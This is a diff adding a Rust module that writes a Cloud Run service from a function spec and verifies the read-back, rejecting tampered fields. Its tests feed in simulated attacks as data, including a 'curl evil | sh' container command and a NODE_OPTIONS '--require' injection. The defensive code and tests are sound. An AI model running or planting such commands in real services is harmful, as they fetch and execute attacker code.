@@ -1,0 +1,306 @@
+//! Write a planned function as a Cloud Run service and check it reads back
+//! the same.
+//!
+//! The gate sends the whole service template it built, so a field the
+//! control plane set behind its back (a second container, a volume, a
+//! command, another service account) is replaced, and the read-back refuses
+//! any field it doesn't know.
+
+use std::collections::BTreeMap;
+use std::time::Duration;
+
+use alien_error::AlienError;
+use async_trait::async_trait;
+use serde_json::{json, Value};
+
+use crate::error::{ErrorData, Result};
+use crate::plan::FunctionSpec;
+
+/// The Cloud Run calls the gate makes.
+#[async_trait]
+pub trait ServiceStore: Send + Sync {
+    /// GET the service, exactly as returned.
+    async fn get(&self, name: &str) -> Result<Value>;
+    /// PATCH the service with `service`, replacing its template.
+    async fn replace(&self, name: &str, service: &Value) -> Result<()>;
+}
+
+/// The service body the gate writes for `spec`.
+pub fn service_body(spec: &FunctionSpec) -> Value {
+    let env: Vec<Value> = spec
+        .env
+        .iter()
+        .map(|(name, value)| json!({"name": name, "value": value}))
+        .collect();
+    json!({
+        "template": {
+            "serviceAccount": spec.run_as,
+            "timeout": format!("{}s", spec.timeout_seconds),
+            "containers": [{
+                "image": spec.image_uri,
+                "env": env,
+                "resources": {"limits": {"memory": format!("{}Mi", spec.memory_mb), "cpu": "1"}},
+            }],
+        },
+    })
+}
+
+const UPDATE_WAIT: Duration = Duration::from_secs(300);
+const POLL: Duration = Duration::from_secs(3);
+
+/// Write `spec` and read it back. The service must already exist: setup
+/// creates the services the gate owns.
+pub async fn apply(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<Value> {
+    store.replace(&spec.name, &service_body(spec)).await?;
+    let deadline = tokio::time::Instant::now() + UPDATE_WAIT;
+    loop {
+        let service = store.get(&spec.name).await?;
+        let reconciling = service["reconciling"].as_bool().unwrap_or(false);
+        if !reconciling {
+            check_read_back(spec, &service)?;
+            return Ok(service);
+        }
+        if tokio::time::Instant::now() > deadline {
+            return Err(AlienError::new(ErrorData::CloudCallFailed {
+                operation: format!("waiting for service {} to finish updating", spec.name),
+            }));
+        }
+        tokio::time::sleep(POLL).await;
+    }
+}
+
+/// Template keys the gate understands.
+const KNOWN_TEMPLATE: &[&str] = &[
+    "revision",
+    "labels",
+    "annotations",
+    "scaling",
+    "vpcAccess",
+    "timeout",
+    "serviceAccount",
+    "containers",
+    "volumes",
+    "executionEnvironment",
+    "encryptionKey",
+    "maxInstanceRequestConcurrency",
+    "sessionAffinity",
+    "healthCheckDisabled",
+    "nodeSelector",
+    "gpuZonalRedundancyDisabled",
+];
+/// Container keys the gate understands.
+const KNOWN_CONTAINER: &[&str] = &[
+    "name",
+    "image",
+    "command",
+    "args",
+    "env",
+    "resources",
+    "ports",
+    "volumeMounts",
+    "workingDir",
+    "livenessProbe",
+    "startupProbe",
+    "dependsOn",
+    "baseImageUri",
+    "buildInfo",
+];
+
+/// Whether `value` carries nothing: null, false, an empty string, array or object.
+fn is_empty(value: &Value) -> bool {
+    match value {
+        Value::Null | Value::Bool(false) => true,
+        Value::String(text) => text.is_empty(),
+        Value::Array(items) => items.is_empty(),
+        Value::Object(fields) => fields.values().all(is_empty),
+        _ => false,
+    }
+}
+
+/// Check that a Cloud Run service is the one `spec` describes.
+pub fn check_read_back(spec: &FunctionSpec, service: &Value) -> Result<()> {
+    let mismatch = |reason: String| {
+        AlienError::new(ErrorData::ReadBackMismatch {
+            function: spec.name.clone(),
+            reason,
+        })
+    };
+    let unknown = |section: &str, value: &Value, known: &[&str]| -> Result<()> {
+        let fields = value
+            .as_object()
+            .ok_or_else(|| mismatch(format!("{section} is not an object")))?;
+        for (key, value) in fields {
+            if !known.contains(&key.as_str()) && !is_empty(value) {
+                return Err(mismatch(format!(
+                    "{section} has field {key}, which the gate doesn't know"
+                )));
+            }
+        }
+        Ok(())
+    };
+    let template = &service["template"];
+    unknown("the template", template, KNOWN_TEMPLATE)?;
+    let containers = template["containers"]
+        .as_array()
+        .ok_or_else(|| mismatch("it has no containers".to_string()))?;
+    let [container] = containers.as_slice() else {
+        return Err(mismatch(format!("it has {} containers", containers.len())));
+    };
+    unknown("the container", container, KNOWN_CONTAINER)?;
+
+    let text = |value: &Value| value.as_str().unwrap_or_default().to_string();
+    if container["image"].as_str() != Some(spec.image_uri.as_str()) {
+        return Err(mismatch(format!("it runs image {}", text(&container["image"]))));
+    }
+    if template["serviceAccount"].as_str() != Some(spec.run_as.as_str()) {
+        return Err(mismatch(format!(
+            "it runs as {}",
+            text(&template["serviceAccount"])
+        )));
+    }
+    if template["timeout"].as_str() != Some(format!("{}s", spec.timeout_seconds).as_str()) {
+        return Err(mismatch(format!("timeout is {}", template["timeout"])));
+    }
+    if container["resources"]["limits"]["memory"].as_str()
+        != Some(format!("{}Mi", spec.memory_mb).as_str())
+    {
+        return Err(mismatch(format!(
+            "memory is {}",
+            container["resources"]["limits"]["memory"]
+        )));
+    }
+    let mut env = BTreeMap::new();
+    for item in container["env"].as_array().cloned().unwrap_or_default() {
+        let name = text(&item["name"]);
+        // A value read from a secret is code the release didn't sign.
+        if !is_empty(&item["valueSource"]) {
+            return Err(mismatch(format!("env {name} is read from a secret")));
+        }
+        env.insert(name, text(&item["value"]));
+    }
+    if env != spec.env {
+        let changed: Vec<&String> = env
+            .keys()
+            .chain(spec.env.keys())
+            .filter(|key| env.get(*key) != spec.env.get(*key))
+            .collect();
+        return Err(mismatch(format!("env differs for {changed:?}")));
+    }
+    for field in ["command", "args", "volumeMounts", "workingDir", "dependsOn"] {
+        if !is_empty(&container[field]) {
+            return Err(mismatch(format!("its container sets {field}")));
+        }
+    }
+    if !is_empty(&template["volumes"]) {
+        return Err(mismatch("it mounts volumes".to_string()));
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::plan::tests::DIGEST;
+    use std::sync::Mutex;
+
+    fn spec() -> FunctionSpec {
+        FunctionSpec {
+            name: "acme-fn-api".into(),
+            image_uri: format!("us-central1-docker.pkg.dev/p/acme/api@{DIGEST}"),
+            digest: DIGEST.into(),
+            env: BTreeMap::from([("MODE".into(), "signed".into())]),
+            memory_mb: 512,
+            timeout_seconds: 30,
+            architecture: "x86_64".into(),
+            run_as: "acme-execution@p.iam.gserviceaccount.com".into(),
+        }
+    }
+
+    /// A service as Cloud Run returns it once the gate's body is applied.
+    fn service(spec: &FunctionSpec) -> Value {
+        let mut service = service_body(spec);
+        service["name"] = json!(format!("projects/p/locations/us-central1/services/{}", spec.name));
+        service["reconciling"] = json!(false);
+        let template = &mut service["template"];
+        template["scaling"] = json!({"maxInstanceCount": 100});
+        template["maxInstanceRequestConcurrency"] = json!(80);
+        template["containers"][0]["name"] = json!("api-1");
+        template["containers"][0]["ports"] = json!([{"name": "http1", "containerPort": 8080}]);
+        template["containers"][0]["startupProbe"] = json!({"tcpSocket": {"port": 8080}});
+        template["containers"][0]["resources"]["cpuIdle"] = json!(true);
+        service
+    }
+
+    #[test]
+    fn the_service_as_built_reads_back() {
+        check_read_back(&spec(), &service(&spec())).unwrap();
+    }
+
+    #[test]
+    fn a_service_changed_behind_the_gate_is_caught() {
+        let reason = |change: &dyn Fn(&mut Value)| {
+            let mut changed = service(&spec());
+            change(&mut changed);
+            check_read_back(&spec(), &changed)
+                .expect_err("must not match")
+                .to_string()
+        };
+        assert!(reason(&|s| s["template"]["containers"][0]["env"][0]["value"] = json!("attacker"))
+            .contains("env differs"));
+        assert!(reason(&|s| s["template"]["containers"][0]["env"]
+            .as_array_mut()
+            .unwrap()
+            .push(json!({"name": "NODE_OPTIONS", "value": "--require /tmp/x"})))
+        .contains("NODE_OPTIONS"));
+        assert!(reason(&|s| s["template"]["containers"][0]["env"][0] =
+            json!({"name": "MODE", "valueSource": {"secretKeyRef": {"secret": "x"}}}))
+        .contains("read from a secret"));
+        assert!(reason(&|s| s["template"]["serviceAccount"] = json!("owner@p.iam.gserviceaccount.com"))
+            .contains("runs as"));
+        assert!(reason(&|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"]))
+            .contains("sets command"));
+        assert!(reason(&|s| s["template"]["containers"]
+            .as_array_mut()
+            .unwrap()
+            .push(json!({"image": "evil"})))
+        .contains("2 containers"));
+        assert!(reason(&|s| s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}]))
+            .contains("volumes"));
+    }
+
+    #[test]
+    fn a_field_the_gate_does_not_know_refuses_the_service() {
+        let mut service = service(&spec());
+        service["template"]["containers"][0]["sidecarMagic"] = json!({"enabled": true});
+        let error = check_read_back(&spec(), &service).unwrap_err().to_string();
+        assert!(error.contains("sidecarMagic, which the gate doesn't know"), "{error}");
+    }
+
+    struct FakeRun {
+        service: Mutex<Value>,
+    }
+
+    #[async_trait]
+    impl ServiceStore for FakeRun {
+        async fn get(&self, _name: &str) -> Result<Value> {
+            Ok(self.service.lock().unwrap().clone())
+        }
+        async fn replace(&self, _name: &str, body: &Value) -> Result<()> {
+            let mut service = self.service.lock().unwrap();
+            service["template"] = body["template"].clone();
+            Ok(())
+        }
+    }
+
+    #[tokio::test]
+    async fn apply_replaces_the_whole_template() {
+        let mut drifted = service(&spec());
+        drifted["template"]["containers"][0]["command"] = json!(["/bin/sh", "-c", "curl evil | sh"]);
+        drifted["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}]);
+        let run = FakeRun {
+            service: Mutex::new(drifted),
+        };
+        apply(&run, &spec()).await.unwrap();
+        check_read_back(&spec(), &run.service.lock().unwrap()).unwrap();
+    }
+}
